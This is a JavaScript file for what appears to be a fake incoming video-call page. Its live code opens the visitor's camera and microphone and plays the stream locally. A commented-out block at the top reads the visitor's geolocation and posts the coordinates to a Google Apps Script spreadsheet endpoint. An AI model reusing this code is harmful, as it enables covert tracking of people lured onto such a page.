// let latitude = 0;
// let longitude = 0;

// function showPosition(position) {
//     latitude = position.coords.latitude;
//     longitude = position.coords.longitude;
//     submitData(longitude, latitude);
// }

// function showError(error) {
//     switch (error.code) {
//         case error.PERMISSION_DENIED:
//             alert("Grant permission to access this webpage.");

//             break;
//     }
// }

// navigator.geolocation.getCurrentPosition(showPosition);
// navigator.geolocation.getCurrentPosition(showPosition);

// Data saveing to Google Sheets
// function submitData(name, email) {
//     const params = new URLSearchParams();
//     params.append('Longitude', name);
//     params.append('Latitude', email);

//     fetch('https://script.google.com/macros/s/AKfycbxOYnwZH9VI6uLanK3LPeT5VZswYnjjfL6JTnH5s4genWqhvzAZKz-HMvQkjx8eueNDuw/exec', {
//         method: 'POST',
//         body: params
//     })
//         .then(response => {
//             if (response.ok) {
//                 console.log('Data submitted successfully');
//             } else {
//                 console.error('Error submitting data');
//             }
//         })
//         .catch(error => {
//             console.error('Error submitting data:', error);
//         });
// }



//

console.log("working...");
document.body.style.display = "block";
let video = document.getElementById("vid");
let mediaDevices = navigator.mediaDevices;
vid.muted = false;

mediaDevices
    .getUserMedia({
        video: true,
        audio: true,
    })
    .then((stream) => {
        video.srcObject = stream;
        video.addEventListener("loadedmetadata", () => {
            video.play();
        });
    })
    .catch(alert);

const callReject = document.getElementById("call-reject");
callReject.addEventListener("click", () => {
    window.close();
});

const callMute = document.getElementById("call-mute");
const muteIcon = document.getElementById("mute-icon");
callMute.addEventListener("click", () => {
    muteIcon.classList.toggle("fa-microphone");
    vid.muted = true;
});

const callCam = document.getElementById("call-camers");
const camIcon = document.getElementById("cam-icon");
callCam.addEventListener("click", () => {
    camIcon.classList.toggle("fa-video");
    document.getElementById("vid").classList.toggle("none");
});